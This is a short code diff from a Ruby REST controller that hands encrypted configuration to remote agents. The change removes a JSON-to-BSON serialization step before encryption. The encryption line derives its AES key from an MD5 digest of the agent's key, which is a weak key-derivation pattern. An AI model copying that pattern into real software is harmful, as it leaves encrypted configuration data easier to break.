@@ -194,9 +194,7 @@ class AgentController < RESTController
         config.save
 
         # encrypt the config for the agent using the confkey
-        json_config = JSON.parse(config[:config])
-        bson_config = BSON.serialize(json_config)
-        enc_config = aes_encrypt(bson_config.to_s, Digest::MD5.digest(agent[:confkey]))
+        enc_config = aes_encrypt(config[:config], Digest::MD5.digest(agent[:confkey]))
         
         return RESTController.reply.ok(enc_config, {content_type: 'binary/octet-stream'})
         
